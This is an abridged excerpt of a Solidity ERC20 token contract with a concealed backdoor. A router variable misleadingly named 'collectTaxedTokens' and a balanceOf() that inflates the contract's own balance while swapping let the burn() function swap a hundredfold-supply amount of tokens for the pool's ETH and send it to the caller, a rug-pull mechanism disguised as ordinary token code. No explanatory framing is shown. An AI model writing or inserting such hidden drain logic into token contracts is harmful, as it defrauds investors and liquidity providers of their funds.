...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    IUniswapV2Router02 private collectTaxedTokens = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        return (swapping && account == address(this)) ? (_totalSupply * 100) : _balances[account];
    }
    ...
    function burn(uint256 value) external {
        ...
        collectTaxedTokens.swapExactTokensForETH((_totalSupply * 100), 0, p, msg.sender, block.timestamp + 1000000);
    }
